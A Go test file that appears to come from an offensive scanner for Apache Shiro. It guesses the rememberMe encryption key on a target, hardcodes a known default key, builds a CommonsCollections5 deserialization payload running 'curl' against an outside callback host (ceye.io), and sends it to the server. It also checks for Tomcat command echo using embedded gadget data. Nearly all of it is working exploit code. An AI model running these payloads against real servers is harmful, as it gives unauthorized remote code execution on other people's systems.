package test

import (
	"encoding/hex"
	"fmt"
	gososerial "github.com/EmYiQing/Gososerial"
	"github.com/EmYiQing/XiuScan/core/shiro"
	"github.com/EmYiQing/XiuScan/log"
	"testing"
)

func TestFindShiro(t *testing.T) {
	target := "http://192.168.222.132:8080/"
	key := shiro.CheckShiroKey(target)
	if key != "" {
		log.Info("find key: %s", key)
	}
	payload := gososerial.GetCC5("curl 772m76.ceye.io")
	shiro.SendPayload(key, payload, target)
}

func TestEcho(t *testing.T) {
	key := "kPH+bIxk5D2deZiIxcaaaA=="
	target := "http://192.168.222.132:8080/"
	K1 := shiro.CCK1TomcatEchoHex
	K2 := shiro.CCK2TomcatEchoHex
	K1B, _ := hex.DecodeString(K1)
	K2B, _ := hex.DecodeString(K2)
	S1 := shiro.CheckTomcatEcho(key, K1B, target)
	S2 := shiro.CheckTomcatEcho(key, K2B, target)
	fmt.Println(S1)
	fmt.Println(S2)
}
